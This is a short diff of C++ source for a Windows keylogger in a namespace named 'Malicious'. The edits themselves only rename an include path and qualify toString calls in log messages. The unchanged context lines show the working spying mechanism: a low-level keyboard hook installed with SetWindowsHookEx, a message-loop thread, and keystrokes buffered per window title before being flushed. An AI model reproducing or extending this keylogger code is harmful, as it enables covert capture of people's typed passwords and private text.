@@ -1,5 +1,5 @@
 #include "Keylogger.hpp"
-#include <common/Log.hpp>
+#include <log/Log.hpp>
 #include <system/File.hpp>
 
 #define MAX_TITLE_SIZE 255
@@ -172,7 +172,7 @@ namespace Malicious
             hThread = CreateThread(0, 0,(LPTHREAD_START_ROUTINE)MsgLoop, 0, 0, &dwThread);
 		    if(hThread == NULL)
 		    {
-			    LOG << "CreateThreadfailed : " + toString(GetLastError());
+			    LOG << "CreateThreadfailed : " + Common::toString(GetLastError());
 		    }
             LOG << "Keylogging enabled";
             isActivated = true;
@@ -186,12 +186,12 @@ namespace Malicious
         {
             if(!TerminateThread(hThread, 0))
 		    {
-			    LOG << "TerminateThread failed : " + toString(GetLastError());
+			    LOG << "TerminateThread failed : " + Common::toString(GetLastError());
 		    }
 
             if(!UnhookWindowsHookEx(hook))
 		    {
-			    LOG << "UnhookWindowsHookEx failed : " + toString(GetLastError());
+			    LOG << "UnhookWindowsHookEx failed : " + Common::toString(GetLastError());
 		    }
             LOG << "Keylogging disabled";
             isActivated = false;
@@ -239,7 +239,7 @@ namespace Malicious
         updateWindowTitle();
         log_buffer[window] += key;
 		buffered_char++;
-		//LOG << "Key : " + toString(key) + " <=> " + window + ", buffer = " + toString(buffered_char);
+		//LOG << "Key : " + Common::toString(key) + " <=> " + window + ", buffer = " + Common::toString(buffered_char);
 		if(buffered_char >= MAX_BUFFERED)
 		{
 			flush();
@@ -253,7 +253,7 @@ namespace Malicious
         Keylogger::instance().hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyloggingProc, GetModuleHandle(0), 0);
 		if(Keylogger::instance().hook == NULL)
 		{
-			LOG << "SetWindowsHookEx failed : " + toString(GetLastError());
+			LOG << "SetWindowsHookEx failed : " + Common::toString(GetLastError());
         }
 
         MSG message;
